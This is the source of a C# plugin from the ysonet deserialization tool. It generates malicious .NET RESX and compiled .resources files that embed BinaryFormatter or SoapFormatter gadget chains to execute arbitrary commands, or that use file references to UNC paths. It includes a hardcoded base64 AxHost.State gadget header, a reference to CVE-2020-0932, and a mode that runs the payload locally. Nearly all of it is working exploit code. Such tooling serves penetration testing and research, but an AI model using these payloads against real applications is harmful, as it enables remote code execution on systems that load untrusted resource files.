using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  There are a number of techniques to make the resource files (refer to the NCC Group blog post). Only a few of them have been included here.
 *  For BinaryFormatter, it uses the TypeConfuseDelegate gadget and for SoapFormatter it uses the ActivitySurrogateSelectorFromFile and ActivitySurrogateSelector gadgets.
 *  .RESX file can be compiled to .RESOURCE using the `resgen.exe payload.resx` command.
 * 
 * Original references: 
 *  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
 *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
 **/

namespace ysonet.Plugins
{
    public class ResxPlugin : IPlugin
    {
        static string mode = "";
        static string file = "";
        static string filerefType = "";
        static string filerefEncoding = "";
        static string command = "";
        static string gadget_name = "";
        static string outputfile = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static bool dosAcknowledged = false;

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: indirect_resx_file, CompiledDotResources (useful for CVE-2020-0932 for example), BinaryFormatter, SoapFormatter.", v => mode = v },
                {"c|command=", "the command to be executed in BinaryFormatter and CompiledDotResources. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
                {"g|gadget=", "The gadget chain used for BinaryFormatter and CompiledDotResources (default: TextFormattingRunProperties).", v => gadget_name = v },
                {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
                {"type=", "indirect_resx_file mode only: the type name the TARGET resolves with Type.GetType when it converts the file reference, which is what decides the effect. Default: " + DefaultFileRefTypeName + ", whose Stream constructor reads the file as a .resources document. System.String makes the target read the file back as text instead, and any other type with a public constructor taking one Stream is activated with the file's bytes.", v => filerefType = v },
                {"enc=", "indirect_resx_file mode only: the encoding name the target passes to Encoding.GetEncoding, used only when --type is System.String. Omitted by default, which makes the target use Encoding.Default.", v => filerefEncoding = v },
                {"of|outputfile=", "a file path location for CompiledDotResources to store the .resources file (default: payload.resources)", v => outputfile = v },
                {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
            };

        // What indirect_resx_file names as the converted type when --type is not given. It is
        // byte for byte what this mode has always emitted, so an existing command produces an
        // identical document.
        public const string DefaultFileRefTypeName =
            "System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        public string Name()
        {
            return "Resx";
        }

        public string Description()
        {
            return "Generates RESX and .RESOURCES files";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        // A public plugin: it is listed everywhere, with or without --display-private.
        public bool IsPrivate() { return false; }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;

            // The option set writes into statics, so a second run in the same process would
            // inherit the first one's values. Clear the two file-reference options before
            // parsing, so a run without --type really is the documented default run - the
            // interactive editor drives a plugin repeatedly in one process.
            filerefType = "";
            filerefEncoding = "";

            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.Test = test;
                inputArgs.DosAcknowledged = dosAcknowledged;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            if (String.IsNullOrWhiteSpace(gadget_name))
            {
                gadget_name = "TextFormattingRunProperties";
            }

            if (String.IsNullOrWhiteSpace(outputfile))
            {
                outputfile = "payload.resources";
            }

            return GetPayload(mode, file, inputArgs);
        }

        public static string GetPayload(string mode, InputArgs inputArgs)
        {
            return GetPayload(mode, "", inputArgs);
        }

        /// <summary>
        /// The one string System.Resources.ResXFileRef.Converter parses when
        /// ResXResourceReader reads the data element below: a path, a type name, and an
        /// optional encoding. What the target does with the file is decided entirely by the
        /// TYPE NAME - System.String makes it read the text back, ResXResourceSet (the
        /// default) makes it read a .resources document, and any other type is activated
        /// with the file's bytes as its Stream argument.
        ///
        /// The composition rule is ResXFileRef.ToString()'s, and it is spelled out here
        /// rather than shared with the ResXFileRef gadget: a plugin's payload lives in the
        /// plugin's own file (Plugins/README.md), and the rule is short enough to state
        /// twice.
        ///
        ///   quote the path when it contains ';' or '"', because the parser reads an
        ///     unquoted path up to the FIRST ';' and a quoted one up to the LAST '"';
        ///   then the separator and the type name;
        ///   then ';' and the encoding name, only when one was asked for.
        ///
        /// The separator keeps the space this mode has always written. Type.GetType skips
        /// leading whitespace in a type name, so the space changes nothing on the target,
        /// and keeping it means every command written before --type existed still produces
        /// a byte-identical document.
        /// </summary>
        private static string ComposeFileRefValue(string path, string typeName, string encodingName)
        {
            if (String.IsNullOrEmpty(typeName) || String.IsNullOrWhiteSpace(typeName))
                typeName = DefaultFileRefTypeName;

            string value = (path.IndexOf(';') >= 0 || path.IndexOf('"') >= 0)
                ? "\"" + path + "\";"
                : path + ";";
            value += " " + typeName;

            if (!String.IsNullOrEmpty(encodingName) && !String.IsNullOrWhiteSpace(encodingName))
                value += ";" + encodingName.Trim();

            return value;
        }
        public static string GetPayload(string mode, string file, InputArgs inputArgs)
        {
            String mtype = "";
            String payloadValue = "";
            string payload = @"<root>
 <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
 <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />
 <xsd:element name=""root"" msdata:IsDataSet=""true"">
 <xsd:complexType>
 <xsd:choice maxOccurs=""unbounded"">
 <xsd:element name=""metadata"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" use=""required"" type=""xsd:string"" />
 <xsd:attribute name=""type"" type=""xsd:string"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""assembly"">
 <xsd:complexType>
 <xsd:attribute name=""alias"" type=""xsd:string"" />
 <xsd:attribute name=""name"" type=""xsd:string"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""data"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 <xsd:element name=""comment"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""2"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" msdata:Ordinal=""1"" />
 <xsd:attribute name=""type"" type=""xsd:string"" msdata:Ordinal=""3"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" msdata:Ordinal=""4"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""resheader"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" />
 </xsd:complexType>
 </xsd:element>
 </xsd:choice>
 </xsd:complexType>
 </xsd:element>
 </xsd:schema>
 <resheader name=""resmimetype"">
 <value>text/microsoft-resx</value>
 </resheader>
 <resheader name=""version"">
 <value>2.0</value>
 </resheader>
 <resheader name=""reader"">
 <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <resheader name=""writer"">
 <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />

<data name=""x"" {0}>
 <value>{1}</value>
 </data>
</root>";
            switch (mode.ToLower())
            {
                case "indirect_resx_file":
                    if (!String.IsNullOrEmpty(file) && !String.IsNullOrWhiteSpace(file))
                    {
                        mtype = @"type=""System.Resources.ResXFileRef""";
                        payloadValue = ComposeFileRefValue(file, filerefType, filerefEncoding);
                    }
                    break;
                case "binaryformatter":
                case "compileddotresources":
                    if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                    {
                        var types = Helpers.AssemblyTypeScanner.SafeGetAllTypes();
                        var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface && !p.AssemblyQualifiedName.Contains("Helpers.TestingArena"));
                        var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase);

                        if (!generators.Contains(gadget_name, StringComparer.CurrentCultureIgnoreCase))
                        {
                            Console.WriteLine("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                            throw new Exception("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                        }

                        string formatter_name = "binaryformatter"; // this is what we need here

                        // Instantiate Payload Generator
                        IGenerator generator = null;
                        try
                        {
                            gadget_name = generators.Where(p => String.Equals(p, gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
                            var container = Activator.CreateInstance(null, "ysonet.Generators." + gadget_name + "Generator");
                            generator = (IGenerator)container.Unwrap();
                        }
                        catch
                        {
                            Console.WriteLine("Gadget not supported!");
                            throw new Exception("Gadget not supported!");
                        }

                        // A denial-of-service gadget is refused before the formatter
                        // check, so the reason a user sees is always the missing
                        // acknowledgement rather than an unrelated incompatibility.
                        string dosRefusal = Helpers.Core.DosPolicy.RefusalIfUnacknowledged(
                            gadget_name, inputArgs.DosAcknowledged);
                        if (!string.IsNullOrEmpty(dosRefusal))
                        {
                            Console.WriteLine(dosRefusal);
                            throw new Exception(dosRefusal);
                        }

                        // Check Generator supports specified formatter
                        if (generator.IsSupported(formatter_name))
                        {
                            // A user-selected gadget goes through the shared runner,
                            // never Generate* directly, so the DoS policy and its
                            // warning are the same here as on the command line.
                            Helpers.Core.RunResult gadgetResult =
                                Helpers.Core.PayloadRunner.GenerateSelectedGadget(generator, formatter_name, inputArgs);
                            if (!gadgetResult.Success)
                            {
                                Console.WriteLine(gadgetResult.ErrorMessage);
                                throw new Exception(gadgetResult.ErrorMessage);
                            }
                            foreach (string warning in gadgetResult.Warnings)
                                Console.Error.WriteLine(warning);
                            byte[] bfPayload = (byte[])gadgetResult.Raw;

                            if (mode.ToLower() == "binaryformatter")
                            {
                                mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";

                                payloadValue = Convert.ToBase64String(bfPayload);
                            }
                            else
                            {
                                string header_AxHostStateGadget = @"zsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAABAAAAAQAAAHpTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUsIFN5c3RlbS5XaW5kb3dzLkZvcm1zLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OVBBRFCCIAusAAAAAIsBAABSQQBjAHQAaQB2AGkAdAB5AFMAdQByAHIAbwBnAGEAdABlAFMAZQBsAGUAYwB0AG8AcgBGAHIAbwBtAEYAaQBsAGUAXwBQAGEAeQBsAG8AYQBkAAAAAABA";


                                using (BinaryWriter binWriter = new BinaryWriter(File.Open(outputfile, FileMode.Create)))
                                {
                                    // Write header of the resources file 
                                    binWriter.Write(Convert.FromBase64String(header_AxHostStateGadget));
                                    // Write body of the resources file (we call it body here but not a body in practice)
                                    binWriter.Write(bfPayload);
                                }

                                payloadValue = "The Resources output file has been written: " + outputfile;
                                payload = "The Resources output file has been written: " + outputfile;
                            }

                        }
                        else
                        {
                            Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                            throw new Exception("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
                        }




                    }
                    break;
                case "soapformatter":
                    mtype = @"mimetype=""text/microsoft-urt/soap-serialized/base64""";
                    if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateInner("SoapFormatter", inputArgs);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    else
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().GenerateInner("SoapFormatter", inputArgs);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    break;
            }

            if (String.IsNullOrEmpty(payloadValue))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p Resx --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            if (mode.ToLower() != "compileddotresources")
            {
                payload = String.Format(payload, mtype, payloadValue);

                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null);
                }
            }

            if (inputArgs.Test)
            {
                try
                {
                    if (mode.ToLower() != "compileddotresources")
                    {
                        using (TextReader sr = new StringReader(payload))
                        {
                            var foo = new ResXResourceReader(sr);
                            if (mode.ToLower() != "binaryformatter")
                                foo.GetEnumerator();
                        }
                    }
                    else
                    {
                        ResourceSet myResourceSet = new ResourceSet(outputfile);
                    }
                }
                catch { }
            }

            return payload;
        }
    }
}
